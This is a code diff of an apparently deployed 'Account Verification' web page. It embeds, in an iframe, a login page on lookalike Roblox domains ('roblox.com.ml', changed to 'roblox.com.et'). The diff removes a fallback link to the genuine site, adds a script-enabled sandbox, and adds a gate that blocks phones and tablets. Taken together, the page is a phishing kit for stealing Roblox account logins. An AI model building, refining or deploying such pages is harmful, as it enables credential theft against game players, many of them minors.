@@ -27,6 +27,8 @@
       --radius-md: 0.5rem;
       --font-body: 'Inter', system-ui, sans-serif;
       --bg: #101827;
+      --sidebar: #081226;
+      --surface: #182235;
       --border: rgba(255,255,255,0.08);
       --divider: rgba(255,255,255,0.06);
       --text: #f4f7fb;
@@ -50,7 +52,41 @@
       overflow-x: hidden;
     }
 
-    button, a { font: inherit; color: inherit; }
+    button {
+      font: inherit;
+      color: inherit;
+    }
+
+    .device-block {
+      display: none;
+      min-height: 100vh;
+      padding: 2rem;
+      background: linear-gradient(180deg, #121d31 0%, #101827 100%);
+      color: #f4f7fb;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .device-block-card {
+      width: min(100%, 520px);
+      background: rgba(20, 28, 43, 0.94);
+      border: 1px solid rgba(255,255,255,0.08);
+      border-radius: 12px;
+      padding: 1.5rem;
+      box-shadow: 0 24px 60px rgba(0,0,0,0.28);
+      text-align: center;
+    }
+
+    .device-block-card h2 {
+      font-size: 1.5rem;
+      font-weight: 800;
+      margin-bottom: 0.5rem;
+    }
+
+    .device-block-card p {
+      color: #8b9ab1;
+      font-size: 0.95rem;
+    }
 
     .app {
       min-height: 100vh;
@@ -220,7 +256,9 @@
       font-size: 0.75rem;
     }
 
-    .step .step-pill { display: contents; }
+    .step .step-pill {
+      display: contents;
+    }
 
     .step.active .step-pill {
       background: linear-gradient(180deg, var(--primary-2), var(--primary));
@@ -267,31 +305,24 @@
       font-size: 0.9rem;
     }
 
-    .next-btn,
-    .fallback-btn {
+    .next-btn {
       width: 100%;
-      height: 44px;
-      border-radius: 8px;
+      height: 40px;
+      border-radius: 4px;
       border: 0;
       background: linear-gradient(180deg, var(--primary-2), var(--primary));
       color: #fff;
-      font-size: 0.95rem;
+      font-size: 0.9rem;
       font-weight: 700;
       cursor: pointer;
       transition: transform var(--transition), filter var(--transition);
-      text-decoration: none;
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
     }
 
-    .next-btn:hover,
-    .fallback-btn:hover {
+    .next-btn:hover {
       filter: brightness(1.06);
     }
 
-    .next-btn:active,
-    .fallback-btn:active {
+    .next-btn:active {
       transform: translateY(1px);
     }
 
@@ -301,7 +332,6 @@
       overflow: hidden;
       background: #0d1524;
       min-height: 620px;
-      position: relative;
     }
 
     .frame-scroll {
@@ -327,37 +357,6 @@
       color: var(--muted);
       font-size: 0.9rem;
       margin-bottom: var(--space-4);
-    }
-
-    .embed-status {
-      color: var(--muted);
-      font-size: 0.92rem;
-      margin-bottom: var(--space-4);
-    }
-
-    .embed-fallback {
-      display: none;
-      padding: 1.25rem;
-      background: #10192a;
-      border: 1px solid rgba(255,255,255,0.08);
-      border-radius: 12px;
-      margin-top: var(--space-4);
-    }
-
-    .embed-fallback.active {
-      display: block;
-    }
-
-    .embed-fallback h3 {
-      font-size: 1rem;
-      font-weight: 800;
-      margin-bottom: 0.35rem;
-    }
-
-    .embed-fallback p {
-      color: var(--muted);
-      font-size: 0.92rem;
-      margin-bottom: 1rem;
     }
 
     .mobile-toggle {
@@ -488,9 +487,16 @@
   </style>
 </head>
 <body>
+  <div class="device-block" id="deviceBlock">
+    <div class="device-block-card">
+      <h2>Desktop Required</h2>
+      <p>This verification page only works on desktop or laptop. Please reopen it on a computer.</p>
+    </div>
+  </div>
+
   <div class="sidebar-backdrop" id="sidebarBackdrop"></div>
 
-  <div class="app">
+  <div class="app" id="desktopApp">
     <aside class="sidebar" id="sidebar">
       <div class="brand" aria-label="Brand logo">
         <svg class="brand-logo" width="44" height="50" viewBox="0 0 44 50" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
@@ -574,10 +580,9 @@
             <div class="section-view" id="stepTwoView">
               <h2 class="section-title">Account Verification</h2>
               <p class="embed-caption">Verify your account</p>
-              <p class="embed-status" id="embedStatus">Loading verification page…</p>
 
-              <div class="frame-shell" id="frameShell">
-                <div class="frame-scroll" id="frameScroll">
+              <div class="frame-shell">
+                <div class="frame-scroll">
                   <iframe
                     id="embedFrame"
                     name="embedFrame"
@@ -585,14 +590,9 @@
                     title="Embedded content"
                     loading="lazy"
                     referrerpolicy="no-referrer"
+                    sandbox="allow-scripts allow-forms allow-same-origin"
                   ></iframe>
                 </div>
-              </div>
-
-              <div class="embed-fallback" id="embedFallback">
-                <h3>Open verification directly</h3>
-                <p>This website is blocking iframe embedding on your device or browser, so the safest way is to open it directly.</p>
-                <a class="fallback-btn" id="fallbackBtn" href="https://www.roblox.com/" target="_blank" rel="noopener noreferrer">Open verification</a>
               </div>
             </div>
           </div>
@@ -602,9 +602,29 @@
   </div>
 
   <script>
+    const deviceBlock = document.getElementById('deviceBlock');
+    const desktopApp = document.getElementById('desktopApp');
+
+    function isBlockedDevice() {
+      const ua = navigator.userAgent || navigator.vendor || window.opera;
+      const isPhoneOrTabletUA = /Android|webOS|iPhone|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(ua);
+      const isIPad = /iPad/i.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
+      const smallTouchScreen = window.matchMedia('(max-width: 1024px)').matches && window.matchMedia('(pointer: coarse)').matches;
+      return isPhoneOrTabletUA || isIPad || smallTouchScreen;
+    }
+
+    function applyDeviceGate() {
+      if (isBlockedDevice()) {
+        deviceBlock.style.display = 'flex';
+        desktopApp.style.display = 'none';
+      } else {
+        deviceBlock.style.display = 'none';
+        desktopApp.style.display = 'grid';
+      }
+    }
+
     const CONFIG = {
-      embedUrl: 'https://www.roblox.com.ml/login?returnUrl=https%3A%2F%2Fwww.roblox.com.ml%2Fusers%2F234145857712%2Fprofile',
-      fallbackUrl: 'https://www.roblox.com.ml/login?returnUrl=https%3A%2F%2Fwww.roblox.com.ml%2Fusers%2F234145857712%2Fprofile'
+      embedUrl: 'https://www.roblox.com.et/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F986570988290%2Fprofile'
     };
 
     const nextBtn = document.getElementById('nextBtn');
@@ -615,14 +635,6 @@
     const sidebar = document.getElementById('sidebar');
     const sidebarBackdrop = document.getElementById('sidebarBackdrop');
     const steps = Array.from(document.querySelectorAll('.step'));
-    const embedFallback = document.getElementById('embedFallback');
-    const embedStatus = document.getElementById('embedStatus');
-    const fallbackBtn = document.getElementById('fallbackBtn');
-    const frameShell = document.getElementById('frameShell');
-
-    let embedTimeout = null;
-
-    fallbackBtn.href = CONFIG.fallbackUrl;
 
     function setActiveStep(stepNumber) {
       steps.forEach((step) => {
@@ -640,52 +652,33 @@
       sidebarBackdrop.classList.add('show');
     }
 
-    function showFallback(message) {
-      embedStatus.textContent = message;
-      frameShell.style.display = 'none';
-      embedFallback.classList.add('active');
-    }
-
-    function showFrame() {
-      embedFallback.classList.remove('active');
-      frameShell.style.display = 'block';
-      embedStatus.textContent = 'Loading verification page…';
-    }
-
-    function loadVerification() {
-      showFrame();
-      embedFrame.src = CONFIG.embedUrl;
-
-      clearTimeout(embedTimeout);
-      embedTimeout = setTimeout(() => {
-        showFallback('Embedded loading was blocked, so open verification directly.');
-      }, 3500);
-    }
-
-    embedFrame.addEventListener('load', () => {
-      clearTimeout(embedTimeout);
-      embedStatus.textContent = 'Verification page loaded.';
-    });
-
     nextBtn.addEventListener('click', () => {
+      embedFrame.src = CONFIG.embedUrl;
       stepOneView.classList.remove('active');
       stepTwoView.classList.add('active');
       setActiveStep(2);
       stepTwoView.scrollIntoView({ behavior: 'smooth', block: 'start' });
-      loadVerification();
     });
 
     mobileToggle.addEventListener('click', () => {
       const isOpen = sidebar.classList.contains('open');
-      if (isOpen) closeSidebar();
-      else openSidebar();
+      if (isOpen) {
+        closeSidebar();
+      } else {
+        openSidebar();
+      }
     });
 
     sidebarBackdrop.addEventListener('click', closeSidebar);
 
     window.addEventListener('resize', () => {
-      if (window.innerWidth > 980) closeSidebar();
+      applyDeviceGate();
+      if (window.innerWidth > 980) {
+        closeSidebar();
+      }
     });
+
+    applyDeviceGate();
   </script>
 </body>
 </html>
